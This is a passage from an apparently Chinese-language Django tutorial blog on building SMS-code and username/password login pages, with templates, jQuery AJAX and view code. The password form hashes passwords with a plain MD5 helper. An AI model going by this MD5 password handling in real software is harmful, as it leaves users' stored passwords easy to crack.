&#125;&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-5"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnSms"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">value</span>=<span class="string">"点击获取验证码"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% else %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        &#123;&#123; field &#125;&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-3"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnSubmit"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">value</span>=<span class="string">"登 陆"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: right"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'login' %&#125;"</span>&gt;</span>用户名密码登陆？<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 点击发送短信</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 倒计时</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 登陆</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-3-点击发送短信"><a href="#2-1-3-点击发送短信" class="headerlink" title="2.1.3 点击发送短信"></a>2.1.3 点击发送短信</h4><h5 id="2-1-3-1-按钮绑定事件，发送ajax请求，获取短信-amp-验证码倒计时"><a href="#2-1-3-1-按钮绑定事件，发送ajax请求，获取短信-amp-验证码倒计时" class="headerlink" title="2.1.3.1 按钮绑定事件，发送ajax请求，获取短信 &amp;  验证码倒计时"></a>2.1.3.1 按钮绑定事件，发送ajax请求，获取短信 &amp;  验证码倒计时</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 页面框架加载完成后自动执行函数</span></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        bindClickBtnSms();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    点击获取验证码的按钮绑定事件</span><br><span class="line">    */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindClickBtnSms</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#btnSms'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//清空错误信息</span></span></span><br><span class="line"><span class="javascript">            $(<span class="string">'.error-msg'</span>).empty();</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取用户的手机号</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> mobilePhone = $(<span class="string">'#id_mobile_phone'</span>).val();</span></span><br><span class="line">            </span><br><span class="line"><span class="actionscript">            <span class="comment">// 发送ajax请求</span></span></span><br><span class="line"><span class="javascript">            $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">                url: <span class="string">"&#123;% url 'send_sms' %&#125;"</span>,</span></span><br><span class="line"><span class="actionscript">                type: <span class="string">"GET"</span>,</span></span><br><span class="line"><span class="actionscript">                data: &#123;mobile_phone: mobilePhone, tpl: <span class="string">"login"</span>&#125;,</span></span><br><span class="line"><span class="actionscript">                dataType: <span class="string">"JSON"</span>,   <span class="comment">// 将服务端返回的数据反序列化为字典</span></span></span><br><span class="line"><span class="actionscript">                success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// ajax发送成功之后，自动执行的函数</span></span></span><br><span class="line">                    if (res.status) &#123;</span><br><span class="line">                        sendSmsRemind();</span><br><span class="line"><span class="actionscript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="comment">// 错误信息 &#123;status:False,error:&#123;mobile_phone:["错误信息",]&#125;&#125;</span></span></span><br><span class="line"><span class="actionscript">                        <span class="comment">//each()循环，循环error获取字典的带key和value的值，通过拼接字符，获得输入框的id，next方法获取下一个标签，然后填写value的值</span></span></span><br><span class="line"><span class="javascript">                        $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                            $(<span class="string">"#id_"</span> + key).next().text(value[<span class="number">0</span>]);</span></span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">     /*</span><br><span class="line">     倒计时</span><br><span class="line">     */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">sendSmsRemind</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> $smsBtn = $(<span class="string">'#btnSms'</span>);</span></span><br><span class="line"><span class="actionscript">        $smsBtn.prop(<span class="string">'disabled'</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> time = <span class="number">60</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> remind = setInterval(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            $smsBtn.val(time + <span class="string">'秒重新发送'</span>);</span></span><br><span class="line">            time = time - 1;</span><br><span class="line">            if (time &lt; 1)&#123;</span><br><span class="line">                clearInterval(remind);</span><br><span class="line"><span class="actionscript">                $smsBtn.val(<span class="string">'点击获取验证码'</span>).prop(<span class="string">'disabled'</span>,<span class="literal">false</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,1000)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">    <span class="comment">// 登陆</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-1-3-2-发送短信-amp-校验手机号"><a href="#2-1-3-2-发送短信-amp-校验手机号" class="headerlink" title="2.1.3.2 发送短信 &amp; 校验手机号"></a>2.1.3.2 发送短信 &amp; 校验手机号</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_sms</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""发送短信"""</span></span><br><span class="line">    form = SendSmsForm(request, data=request.GET)</span><br><span class="line">    <span class="comment"># 只是校验手机号：不能为空、格式是否正确</span></span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 发短信</span></span><br><span class="line">        <span class="comment"># 写redis（django-redis）</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure><h4 id="2-1-4-登陆"><a href="#2-1-4-登陆" class="headerlink" title="2.1.4 登陆"></a>2.1.4 登陆</h4><p>个登陆按钮绑定事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">登陆</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindClickSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#btnSubmit'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">'.error-msg'</span>).empty();</span><br><span class="line">        <span class="comment">//搜集表单的数据(每一个字段的数据)</span></span><br><span class="line">        <span class="comment">// $("#regForm").serialize() 所有字段的数据 + csrf token</span></span><br><span class="line">        <span class="comment">//通过ajax发送到后台</span></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"&#123;% url 'login_sms' %&#125;"</span>,</span><br><span class="line">            type:<span class="string">"POST"</span>,</span><br><span class="line">            data:$(<span class="string">"#smsForm"</span>).serialize(),</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (res.status)&#123;</span><br><span class="line">                    location.href = res.data <span class="comment">//跳转</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">                        $(<span class="string">"#id_"</span> + key).next().text(value[<span class="number">0</span>]);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过form表单进行校验，后端短信登陆视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_sms</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""短信登陆"""</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        form = LoginSmsForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'web/login_sms.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br><span class="line">    form = LoginSmsForm(request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 用户输入正确，登陆成功</span></span><br><span class="line">        mobile_phone = form.cleaned_data[<span class="string">'mobile_phone'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用户信息放入session</span></span><br><span class="line">        user_obj = models.UserInfo.objects.filter(mobile_phone=mobile_phone).first()</span><br><span class="line">        request.session[<span class="string">'username'</span>] = user_obj.username</span><br><span class="line">        request.session[<span class="string">'user_id'</span>] = user_obj.pk</span><br><span class="line">        request.session.set_expiry(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">        print(user_obj)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: <span class="string">'/index/'</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure><h3 id="2-2-账号密码登陆"><a href="#2-2-账号密码登陆" class="headerlink" title="2.2 账号密码登陆"></a>2.2 账号密码登陆</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86.jpg"  alt="账号密码登陆"></p><h4 id="2-2-1构造url路径"><a href="#2-2-1构造url路径" class="headerlink" title="2.2.1构造url路径"></a>2.2.1构造url路径</h4><p>在urls.py文件下构造登录路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^login/$'</span>, account.login, name=<span class="string">'login'</span>),</span><br></pre></td></tr></table></figure><h4 id="2-2-2-页面展示"><a href="#2-2-2-页面展示" class="headerlink" title="2.2.2 页面展示"></a>2.2.2 页面展示</h4><ul><li>构造form表单</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginForm</span><span class="params">(BootSrtapForm,forms.Form)</span>:</span></span><br><span class="line">    username = forms.CharField(label=<span class="string">'邮箱或手机号'</span>)</span><br><span class="line">    password = forms.CharField(label=<span class="string">'密码'</span>,widget=forms.PasswordInput)</span><br><span class="line">    code = forms.CharField(label=<span class="string">'图片验证码'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,request,*args,**kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args,**kwargs)</span><br><span class="line">        self.request = request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""钩子 图片验证码"""</span></span><br><span class="line">        <span class="comment"># 读取用户输入的验证码</span></span><br><span class="line">        code = self.cleaned_data[<span class="string">'code'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 在session获取图片验证码</span></span><br><span class="line">        session_code = self.request.session.get(<span class="string">'image_code'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session_code:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">"验证码已过期，请重新获取"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code.upper().strip() != session_code.upper().strip():    <span class="comment"># upper()小写</span></span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">"验证码输入错误"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_password</span><span class="params">(self)</span>:</span></span><br><span class="line">        pwd = self.cleaned_data[<span class="string">'password'</span>]</span><br><span class="line">        <span class="comment"># 加密 $ 返回</span></span><br><span class="line">        <span class="keyword">return</span> encrypt.md5(pwd)</span><br></pre></td></tr></table></figure><ul><li>账号密码登陆的视图函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""用户名密码登陆"""</span></span><br><span class="line">    form = LoginForm(request)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'web/login.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><p><code>login.html</code>模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/basic.html' %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/account.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-msg</span> &#123;</span></span><br><span class="line">            color: red;</span><br><span class="line">            position: absolute;</span><br><span class="line">        &#123;# 绝对定位 #&#125; font-size: 13px;</span><br><span class="line">        &#123;# 字体大小 #&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">    用户登陆</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"account"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>用户登陆<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">            &#123;% csrf_token %&#125;</span><br><span class="line">            &#123;% for field in form %&#125;</span><br><span class="line">                &#123;% if field.name == 'code' %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-7"</span>&gt;</span></span><br><span class="line">                                &#123;&#123; field &#125;&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span>&#123;&#123; field.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-5"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% url 'image_code' %&#125;"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"imageCode"</span> <span class="attr">title</span>=<span class="string">"看不清，点击更换图片"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% elif field.name == 'password' %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        &#123;&#123; field &#125;&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span>&#123;&#123; field.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: right"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'resetpassword' %&#125;"</span>&gt;</span>忘记密码？<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                &#123;% else %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        &#123;&#123; field &#125;&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span>&#123;&#123; field.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float: right"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'login_sms' %&#125;"</span>&gt;</span>短信验证码登陆？<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-3"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">value</span>=<span class="string">"登 陆"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 点击更换图片验证码</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h4 